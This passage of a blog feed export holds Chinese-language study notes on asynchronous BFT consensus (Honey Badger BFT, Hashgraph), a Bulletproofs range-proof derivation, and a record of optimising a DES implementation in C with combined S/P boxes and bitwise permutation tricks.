PBFT中leader本身作恶，发给一部分节点能通过校验的区块，而发给另一部分节点不能通过校验的区块</p><p>而Honey Badger BFT异步共识算法不存在timer，并引入了随机源来解决上述问题，使得共识不会停滞（失去活性）；</p><p>HB-BFT中随机源采用的方案是对Coins' sid的(n, f+1)阈值签名（➡ f个拜占庭节点不可能得到合法签名）；</p><figure><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_12.png" alt="Figure_12"><figcaption aria-hidden="true">Figure_12</figcaption></figure><h4 id="reference">Reference</h4><ul><li>The Honey Badger of BFT Protocols (paper)</li><li>Signature-Free Asynchronous Byzantine Consensus with t &lt; n/3 and O(n 2 ) Messages (paper)</li><li><a href="https://learnblockchain.cn/article/2494#RBC--Reliable-Broadcast-" target="_blank" rel="noopener">https://learnblockchain.cn/article/2494#RBC--Reliable-Broadcast-</a></li></ul><h3 id="hashgraph">Hashgraph</h3><blockquote><p>Hashgraph - a data structure that records who gossiped to whom, and in what order.</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_4_Figure_1.png"></p><ul><li><p>Hashgraph基础数据单元为event（包含TransactionSet、Timestamp和两个父event的HashValue）</p></li><li><p>Hashgraph网络下使用gossip协议进行通信，每个节点不停随机选择其他节点sync<strong>"己方已知但对方未知"</strong>的events，receiver收到sync后则创建自己的最新event（父hash分别指向<code>self-parent</code>和sender的最新event），并同样向随机节点sync</p><p>因此实际上传输的是<em>hashgraph itself</em>，即gossip about gossip协议：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-13_15-27-51.jpg"></p></li><li><p>Hashgraph将event按round划分，首先引入前置概念：</p><ul><li>See: 如果event w存在到event x的通路（有向边），则称w see x</li><li>Strongly see: 如果网络节点总数为n，event w可见超过2n/3个<strong>不同</strong>节点的event（且这些event均可见event x），则称w strongly see x</li></ul><p>对于Hashgraph下的节点，每一round中其创建的第一个event被记作<strong>witness</strong>（见证人）</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214170712208.png"></p><p>每一个event都存在对应的<strong>round created number</strong>：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_8_Figure_3.png"></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214171338852.png"></p><p>若event w的父event中最大round为r，则其round created number相应的为r或r+1（<strong>r+1当且仅当w能strongly see超过2n/3个不同节点下round r的witness</strong>➡成为新一轮witness）</p></li><li></li></ul><h4 id="reference-1">Reference</h4><ul><li>THE SWIRLDS HASHGRAPH CONSENSUS ALGORITHM: FAIR, FAST, BYZANTINE FAULT TOLERANCE (paper)</li></ul><h3 id="dumbo-bft">Dumbo BFT</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Survey of Blockchain consensus algorithm</title>
      <link href="/2021/11/12/Survey-of-Blockchain-consensus-algorithm/"/>
      <url>/2021/11/12/Survey-of-Blockchain-consensus-algorithm/</url>
      
        <content type="html"><![CDATA[<h3 id="report">Report</h3><div class="row">    <embed src="Survey_of_Blockchain_consensus_algorithm.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bullet Proofs</title>
      <link href="/2021/10/31/Bullet-Proofs/"/>
      <url>/2021/10/31/Bullet-Proofs/</url>
      
        <content type="html"><![CDATA[<h3 id="pedersen-commitment">Pedersen Commitment</h3><p><span class="math inline">\(Com(v)=v\cdot B+\tilde{v}\cdot\tilde{B}\)</span>，其中<span class="math inline">\(B,\tilde{B}\)</span>为椭圆曲线上的两个基点，<span class="math inline">\(v\)</span>是需要承诺的秘密数，<span class="math inline">\(\tilde{v}\)</span>为（随机）盲化因子。</p><p>具备同态加法特性，即：</p><p><span class="math inline">\(Com(v_1)+Com(v_2)=v_1\cdot B+\tilde{v_1}\cdot\tilde{B}+v_2\cdot B+\tilde{v_2}\cdot\tilde{B}=(v_1+v_2)\cdot B+(\tilde{v_1}+\tilde{v_2})\cdot\tilde{B}=Com(v_1+v_2)\)</span></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101220609819.png"></p><p>同态保证了UTXO交易中的Input/Output总和均是Pedersen Commitment</p><p>⭐<strong>(Pedersen Vector Commitment)</strong></p><p><span class="math inline">\(\textbf{B}=(B_1,...,B_n)\in\mathbb{G}^n\)</span></p><p><span class="math inline">\(Com(\textbf{v}=(v_1,...,v_n);\tilde{v})=\langle\textbf{v},\textbf{B}\rangle+\tilde{v}\tilde{B}\)</span></p><h3 id="bullet-proofs">Bullet Proofs</h3><h4 id="notation">Notation</h4><p>小写字母<span class="math inline">\(a,b,c\)</span>表示<span class="math inline">\(\mathbb{Z}_p\)</span>下的标量，大写字母<span class="math inline">\(G,H,P,Q\)</span>表示群<span class="math inline">\(\mathbb{G}\)</span>下的元素。向量被粗体表示，例如<span class="math inline">\(\textbf{a},\textbf{G}\)</span>。</p><p>用到的Pedersen Vector Commitment定义为： <span class="math display">\[Com(\textbf{a}_L,\textbf{a}_R)=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}\]</span> 其中<span class="math inline">\(\textbf{G},\textbf{H}\in\mathbb{G}^n\)</span></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101225906030.png"></p><h4 id="inner-product-range-proof">Inner-Product Range Proof</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101222443822.png"></p><p>并将原论文中的乘法群以加法群代替，如下：</p><p><span class="math inline">\(\{(B,\tilde{B}\in\mathbb{G},V,n\ ;\ v,\tilde{v}\in\mathbb{Z}_p):V=vB+\tilde{v}\tilde{B}\ \wedge\ v\in[0,2^n-1]\}\)</span></p><p>令<span class="math inline">\(\textbf{a}_L=(a_1,...,a_n)\in\{0,1\}^n\)</span>表示由<span class="math inline">\(v\)</span>各个比特位组成的向量，即<span class="math inline">\(\langle\textbf{a}_L,\textbf{2}^n\rangle=v\)</span> ← ①</p><p>还需要保证<span class="math inline">\(\textbf{a}_L\)</span>仅包含<span class="math inline">\(\{0,1\}\)</span>，因此令<span class="math inline">\(\textbf{a}_R=\textbf{a}_L-\textbf{1}^n\)</span> ← ②，有<span class="math inline">\(\textbf{a}_L\circ\textbf{a}_R=\textbf{0}^n\)</span> ← ③</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102163505168.png"></p><p>做以下整理： <span class="math display">\[\langle\textbf{a}_L,\textbf{2}^n\rangle=v\ \wedge\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle=0\ \wedge\ \langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle=0\]</span> 可进一步，令verifier选取随机<span class="math inline">\(z\in\mathbb{Z}_p\)</span>，将上述转为一个约束： <span class="math display">\[z^2\cdot v=z^2\langle\textbf{a}_L,\textbf{2}^n\rangle+z\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle+\langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle\]</span> 将其转化为前面论文中提到的"a single inner-product constraint"（并令<span class="math inline">\(\textbf{a}_L\)</span>只出现在左侧，<span class="math inline">\(\textbf{a}_R\)</span>只出现在右侧，不含witness的项合并即为<span class="math inline">\(\delta\)</span>）：</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102181623065.png"></p><p>将此时内积的左侧记作<em>unblinded l(X)</em>，右侧记作<em>unblinded r(X)</em></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171502891.png"></p><p>下面是盲化后新定义的多项式<span class="math inline">\(l(X),r(X)\)</span>，以及二次多项式<span class="math inline">\(t(X)\)</span>：</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171740440.png"></p><p>Prover需要证明<span class="math inline">\(t_0=z^2v+\delta(y,z)\)</span>，<span class="math inline">\(l(X),r(X)\)</span>正确，以及<span class="math inline">\(t(X)=\langle l(X),r(X)\rangle\)</span></p><hr><p><span class="math inline">\(\mathcal{P}\)</span> computes:</p><p><span class="math inline">\(\quad\tilde{t_1},\tilde{t_2}\longleftarrow\mathbb{Z}_p\)</span></p><p><span class="math inline">\(\quad T_i=t_1B+\tilde{t_1}\tilde{B}\in\mathbb{G},\quad i=\{1,2\}\)</span></p><p><span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:T_1,T_2\)</span></p><p><span class="math inline">\(\mathcal{V}:x\longleftarrow\mathbb{Z}^{*}_{p}\quad(\mathbb{Z}_{p}\backslash\{0\})\)</span></p><p><span class="math inline">\(\mathcal{V}\rightarrow\mathcal{P}:x\)</span> // a random challenge</p><p><span class="math inline">\(\mathcal{P}\)</span> computes:</p><p><span class="math inline">\(\quad\textbf{l}=l(x)=\textbf{a}_L+\textbf{s}_L\cdot x-z\cdot\textbf{1}\in\mathbb{Z}^{n}_{p}\)</span></p><p><span class="math inline">\(\quad\textbf{r}=r(x)=\textbf{y}^{n}\circ(\textbf{a}_R+\textbf{s}_R\cdot x+z\cdot\textbf{1})+z^2\cdot\textbf{2}^n\in\mathbb{Z}^{n}_{p}\)</span></p><p><span class="math inline">\(\quad\textbf{t}=t(x)=\langle\textbf{l},\textbf{r}\rangle\in\mathbb{Z}_p\)</span></p><p><span class="math inline">\(\quad\tilde{t}=z^2\cdot\tilde{v}+\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2\in\mathbb{Z}_p\)</span> // blinding value for <span class="math inline">\(\textbf{t}\)</span></p><p><span class="math inline">\(\quad\tilde{e}=\tilde{a}+\tilde{s}\cdot x\in\mathbb{Z}_p\)</span> // <span class="math inline">\(\tilde{a},\tilde{s}\)</span> blind <span class="math inline">\(A,S\)</span></p><p><span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:\textbf{t},\tilde{t},\tilde{e},\textbf{l},\textbf{r}\)</span></p><hr><p>而更在上述（分割线内）步骤之前，还需要先于"<span class="math inline">\(\mathcal{V}\rightarrow\mathcal{P}:challenge\ value\ y\)</span>"，<span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:commitment\ A,S\)</span>：</p><p><span class="math inline">\(A=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}\)</span></p><p><span class="math inline">\(S=\langle\textbf{s}_L,\textbf{G}\rangle+\langle\textbf{s}_R,\textbf{H}\rangle+\tilde{s}\tilde{B}\)</span></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103172058685.png"></p><p>但需要对复合变量<span class="math inline">\(\textbf{y}^{n}\circ\textbf{a}_R,\textbf{y}^{n}\circ\textbf{s}_R\)</span>作出承诺，且</p><p><span class="math inline">\(Com(\textbf{a}_L,\textbf{a}_R,\tilde{a})=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{y}^n\circ\textbf{a}_R,\textbf{y}^{-n}\circ\textbf{H}\rangle+\tilde{a}\tilde{B}\)</span></p><p>因此令<span class="math inline">\(\textbf{H&#39;}=\textbf{y}^{-n}\circ\textbf{H}\)</span>，即<span class="math inline">\(H_i^{&#39;}=y^{-i+1}\cdot H_i,\quad i=1,...,n\)</span></p><p>由 <em>Verifier</em> 将原commitment A, S变形为对应<span class="math inline">\(\textbf{H&#39;}\)</span>以及复合变量的commitment</p><hr><p>All based on <em>ECDLP</em></p><p><span class="math inline">\(\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}V+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2\)</span> // ① check that <span class="math inline">\(\textbf{t}=z^2v+\delta(y,z)+t_1x+t_2x^2\)</span></p><p><span class="math inline">\(A+S\cdot x-z\langle\textbf{1},\textbf{G}\rangle+\langle z\textbf{y}^n+z^2\textbf{2}^n,\textbf{H&#39;}\rangle-\tilde{e}\tilde{B}\stackrel{?}{=}\langle\textbf{l},\textbf{G}\rangle+\langle\textbf{r},\textbf{H&#39;}\rangle\)</span> // ② check that <span class="math inline">\(l(X),r(X)\)</span> are correct</p><p><span class="math inline">\(\textbf{t}\stackrel{?}{=}\langle\textbf{l},\textbf{r}\rangle\)</span> // ③ check that <span class="math inline">\(t(X)=\langle l(X),r(X)\rangle\)</span></p><hr><p>但校验②③：<em>Prover</em>和<em>Verifier</em>之间直接传输<span class="math inline">\(\textbf{l},\textbf{r}\)</span>，导致需要<span class="math inline">\(2n\)</span>个标量的带宽</p><h4 id="logarithmic-range-proof">Logarithmic Range Proof</h4><p>内积协议一般用于证明以下关系： <span class="math display">\[\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,P\in\mathbb{G},c\in\mathbb{Z}_p;\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}\wedge c=\langle\textbf{a},\textbf{b}\rangle\}\]</span> <img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103202149106.png"></p><p>等价于证明： <span class="math display">\[\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,u,P\in\mathbb{G};\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u\}\]</span> 引入中间变量<span class="math inline">\(x\in\mathbb{Z}_{p}^{\times}\)</span>，记<span class="math inline">\(n&#39;=n/2\)</span>，对原始的<span class="math inline">\(\textbf{a},\textbf{b},\textbf{G},\textbf{H}\)</span>作以下变换： <span class="math display">\[\textbf{a}&#39;=x\textbf{a}_{[:n&#39;]}+x^{-1}\textbf{a}_{[n&#39;:]}\in\mathbb{Z}_p^{n&#39;}\\\textbf{b}&#39;=x^{-1}\textbf{b}_{[:n&#39;]}+x\textbf{b}_{[n&#39;:]}\in\mathbb{Z}_p^{n&#39;}\\\textbf{G}&#39;=x^{-1}\textbf{G}_{[:n&#39;]}+x\textbf{G}_{[n&#39;:]}\in\mathbb{G}^{n&#39;}\\\textbf{H}&#39;=x\textbf{H}_{[:n&#39;]}+x^{-1}\textbf{H}_{[n&#39;:]}\in\mathbb{G}^{n&#39;}\\\]</span> 令<span class="math inline">\(P&#39;=\langle\textbf{a}&#39;,\textbf{G}&#39;\rangle+\langle\textbf{b}&#39;,\textbf{H}&#39;\rangle+\langle\textbf{a}&#39;,\textbf{b}&#39;\rangle u\)</span></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103215000179.png"></p><p>当<span class="math inline">\(P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u\)</span>成立时，上述推导成立，即<span class="math inline">\(P&#39;=P+x^2L+x^{-2}R\)</span></p><p>此时传输的<span class="math inline">\(\textbf{a},\textbf{b}\)</span>就转为了<span class="math inline">\(\textbf{a}&#39;,\textbf{b}&#39;\)</span>（带宽/2）</p><p>因此我们可以递归压缩<span class="math inline">\(P\)</span>（记作<span class="math inline">\(P^{(0)}\)</span>），得到</p><p><span class="math inline">\(P^{(k)}=\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u\)</span></p><p><span class="math inline">\(P^{(k)}=P^{(0)}+\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})\)</span></p><p>此时<em>Verifier</em>只需验证 <span class="math display">\[P^{(0)}\stackrel{?}{=}\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u-\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})\]</span> 即可</p><p><em>Proofer</em>需要发送<span class="math inline">\((\textbf{a}^{(k)},\textbf{b}^{(k)})\)</span>以及<span class="math inline">\(k\)</span>轮的<span class="math inline">\((L,R)\)</span>，消耗带宽从<span class="math inline">\(2n\)</span>降到了<span class="math inline">\(2logn+2\)</span>.</p><p>将前文的<strong>校验②③</strong>改用这种方法，来实现对数级的压缩。</p><h4 id="aggregating-logarithmic-proofs">Aggregating Logarithmic Proofs</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104201755929.png"></p><p>红框中为<span class="math inline">\(\sum_{j=1}^{m}(z^{1+j})\)</span>，而非<span class="math inline">\(\sum z^2\)</span>，是因为下面原有式子中的<span class="math inline">\(z^{2}\)</span>，在<span class="math inline">\(m\)</span>个individual range proofs整合时，采用不同的幂次<span class="math inline">\(z^{3},z^{4},...\)</span>（仍然成立）</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104202958100.png"></p><p>进一步的，定义新的 <span class="math inline">\(\tilde{t}=\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2+\sum_{j=1}^{m}z^{1+j}\cdot\tilde{v_j}\)</span> （其中<span class="math inline">\(\tilde{v_j}\)</span>为对应<span class="math inline">\(v_j\)</span>的盲化因子，<span class="math inline">\(j=1,...,m\)</span>）</p><p><span class="math inline">\(\delta(y,z)=(z-z^2)\langle\textbf{1}^{n\cdot m},\textbf{y}^{n\cdot m}\rangle-\sum_{j=1}^{m}z^{j+2}\langle\textbf{1}^{n},\textbf{2}^{n}\rangle\)</span></p><p>前文的校验①改写为： <span class="math display">\[\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}\langle\textbf{z}^{m},\textbf{V}\rangle+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2\\,其中\ \textbf{V}=(V_1,V_2,...,V_m)\in\mathbb{G}^{m},\textbf{z}^{m}=(1,z,z^2,...,z^{m-1})\in\mathbb{Z}_{p}^{m}\]</span> 校验②的<strong>左侧</strong>改写为： <span class="math display">\[A+S\cdot x-z\langle\textbf{1}^{n\cdot m},\textbf{G}\rangle+\langle z\textbf{y}^{n\cdot m}+\sum_{j=1}^{m}z^{1+j}\cdot(\textbf{0}^{(j-1)n}\|\textbf{2}^n\|\textbf{0}^{(m-j)n},\textbf{H&#39;}\rangle-\tilde{e}\tilde{B}\]</span> <img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222111097.png"></p><h4 id="non-interactive-proof-through-fiat-shamir">Non-Interactive Proof through Fiat-Shamir</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222420877.png"></p><p>Fiat-Shamir直观表示可看知乎回答<a href="https://zhuanlan.zhihu.com/p/95921725" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/95921725</a></p><h3 id="todo">TODO</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem</title>
      <link href="/2021/10/28/Engineering-Practice-of-Cryptosystem/"/>
      <url>/2021/10/28/Engineering-Practice-of-Cryptosystem/</url>
      
        <content type="html"><![CDATA[<h4 id="assignment">Assignment</h4><p>略</p><h4 id="record">Record</h4><p>实现DES的时候发现性能一直提不上去（v1测试后≈750us/KB，距离要求的500Mbps还有亿点点距离...🤦‍）</p><p>在此记录尝试提升性能过程中更迭的几个版本</p><h5 id="combine-s-and-p-boxes"><em>Combine S and P boxes</em></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> spbox[<span class="number">8</span>][<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_spbox</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++) &#123;</span><br><span class="line">            spbox[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> real_j = ((((j &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x02</span>) | (j &amp; <span class="number">0x01</span>)) &lt;&lt; <span class="number">4</span>) | ((j &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sbox[i][real_j] &amp; (<span class="number">0x08</span> &gt;&gt; k)) &#123;</span><br><span class="line">                    spbox[i][j] |= <span class="number">1</span> &lt;&lt; (<span class="number">32</span> - inv_pbox[<span class="number">4</span> * i + k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//#ifdef DEBUG</span></span><br><span class="line"><span class="comment">//            printf("spbox[%d][%2d]=%08x\n", i, j, spbox[i][j]);</span></span><br><span class="line"><span class="comment">//#endif</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="construct-fewer-bit-operations"><em>Construct fewer Bit Operations</em></h5><p>开销主要在于BIT_TO_BYTE和BYTE_TO_BIT 👉 IP，PC-1，PC-2等置换均是基于bit数组上做的处理</p><p>因此参考mbed TLS，摒弃bit数组，构造更少步骤的位运算来提升性能</p><ul><li><p>Initial Permutation (IP)</p><p>mbed TLS用到一个小trick：</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028203914919.png"></p><p>可以达到类似shuffle的目的，我们再回过头来看IP：</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028204203451.png"></p><p><strong>逆推</strong>回初始的X = [1 2 ... 32], Y = [33 34 ... 64]状态（找如何shuffle能得到<strong>连续序列</strong>）</p><p>逆推过程的逻辑很清晰，但不在此特意画出，下面是正向的变换逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">4</span>) ^ Y) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">Y ^= T  </span><br><span class="line">X ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">16</span>) ^ Y) &amp; <span class="number">0x0000ffff</span></span><br><span class="line">Y ^= T</span><br><span class="line">X ^= (T &lt;&lt; <span class="number">16</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">2</span>) ^ X) &amp; <span class="number">0x33333333</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">2</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">57</span> <span class="number">58</span> <span 